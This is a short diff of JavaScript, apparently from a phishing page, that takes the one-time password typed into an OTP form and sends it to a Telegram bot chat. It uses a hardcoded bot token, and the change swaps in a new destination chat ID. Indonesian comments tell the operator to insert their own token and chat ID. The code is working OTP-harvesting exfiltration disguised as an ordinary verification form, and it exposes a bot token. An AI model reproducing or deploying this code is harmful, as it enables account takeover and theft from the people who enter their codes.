@@ -5,7 +5,7 @@ document.getElementById('otpform').addEventListener('submit', function(event) {
     const otp = document.getElementById('otp').value;
 
     const token = '7376694883:AAGyPTpO0iJsT4-PQmc1VZOl3I95SS2lduo'; // Ganti dengan token bot Anda
-    const chatId = '-4727810031'; // Ganti dengan ID chat Anda
+    const chatId = '8072206481'; // Ganti dengan ID chat Anda
 
     const text = `OTP: ${otp} `;
     const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
